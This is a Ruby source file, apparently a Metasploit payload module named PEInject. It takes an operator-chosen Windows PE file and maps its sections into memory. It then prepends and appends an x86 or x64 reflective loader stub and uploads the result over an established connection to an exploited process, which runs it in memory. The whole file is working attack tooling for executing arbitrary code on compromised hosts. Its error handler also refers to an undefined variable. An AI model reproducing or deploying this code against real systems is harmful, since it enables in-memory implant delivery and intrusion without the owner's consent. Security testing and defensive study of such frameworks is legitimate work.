# -*- coding: binary -*-

require 'msf/core/payload/windows'
require 'msf/core/payload/windows/reflective_pe_loader'
require 'msf/core/payload/windows/x64/reflective_pe_loader'

module Msf

  ###
  #
  # Reflective PE  module injects a custom native PE file into the exploited process using a relective PE loader stub
  #
  ###

  module Payload::Windows::PEInject
    include Msf::Payload::Windows::ReflectivePELoader
    include Msf::Payload::Windows::ReflectivePELoader_x64
    def initialize(info = {})
      super
      register_options([OptPath.new('PE', [ true, 'The local path to the PE file to upload' ]),], self.class)
    end

    #
    # Returns the PE file path
    #
    def pe_path
      datastore['PE']
    end

    #
    # Transmits the reflective PE payload to the remote
    # computer so that it can be loaded into memory.
    #
    def handle_connection(conn, _opts = {})
      data = ''
      begin
        File.open(pe_path, 'rb') do |f|
          data += f.read
        end
      rescue StandardError
        print_error("Failed to load PE: #{$ERROR_INFO}.")
        elog('Failed to load the PE file', error: e)
        # TODO: exception
        conn.close
        return
      end
      print_status('Premapping PE file...')
      mapped_pe = create_pe_memory_map(data, arch_to_s)
      print_status("Mapped PE size #{mapped_pe.length}")
      p = encapsulate_reflective_stub(mapped_pe, arch_to_s)
      print_status("Uploading reflective PE (#{p.length} bytes)...")
      # Send the size of the thing we're transferring
      conn.put([ p.length ].pack('V'))
      # Send the image name + image
      conn.put(p)
      print_status('Upload completed.')
      conn.close
    end

    def encapsulate_reflective_stub(mapped_pe, arch)
      call_size = mapped_pe.length + 5
      reflective_loader = ''
      if arch.eql?('x86')
        reflective_loader = Metasm::Shellcode.assemble(Metasm::X86.new, "cld\ncall $+#{call_size}").encode_string
        reflective_loader += mapped_pe
        reflective_loader += Metasm::Shellcode.assemble(Metasm::X86.new, asm_reflective_pe_loader).encode_string
      elsif arch.eql?('x64')
        reflective_loader = Metasm::Shellcode.assemble(Metasm::X64.new, "cld\ncall $+#{call_size}").encode_string
        reflective_loader += mapped_pe
        reflective_loader += Metasm::Shellcode.assemble(Metasm::X64.new, asm_reflective_pe_loader_x64).encode_string
      else
        raise ArgumentError, "Unsupported architecture: #{arch}"
      end
      reflective_loader
    end

    def create_pe_memory_map(file, arch)
      pe = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(file))
      unless (arch.eql?('x86') && pe.ptr_32?) || (arch.eql?('x64') && pe.ptr_64?)
        raise ArgumentError, "Selected PE file is not #{arch_to_s}"
      end

      # TODO: Add reflective CLR loading support
      unless pe.hdr.opt['DataDirectory'][14].v['Size'] == 0
        raise 'PE files with CLR is not currently supported'
      end

      unless pe.hdr.opt['DataDirectory'][5].v['Size'] != 0
        raise 'PE file is missing relocation data'
      end

      pe_map = ''
      offset = 0
      virtual_offset = pe.image_base
      vprint_status("ImageBase: 0x#{pe.image_base.to_s(16)}")
      vprint_status("#{pe.sections.first.name} VMA: 0x#{(pe.image_base + pe.sections.first.vma).to_s(16)}")
      vprint_status("#{pe.sections.first.name} Offset: 0x#{pe.sections.first.file_offset.to_s(16)}")
      until offset == pe.sections.first.file_offset
        pe_map << file[offset]
        virtual_offset += 1
        offset += 1
      end

      # Map PE sections
      pe.sections.each do |sec|
        pe_map << "\x00" * ((sec.vma + pe.image_base) - virtual_offset)
        virtual_offset = sec.vma + pe.image_base
        pe_map << sec.read(0, sec.raw_size)
        virtual_offset += sec.raw_size
        pe_map << "\x00" * ((sec.vma + pe.image_base + sec.size) - virtual_offset)
        virtual_offset = sec.vma + pe.image_base + sec.size
      end
      pe_map
    end
  end
end
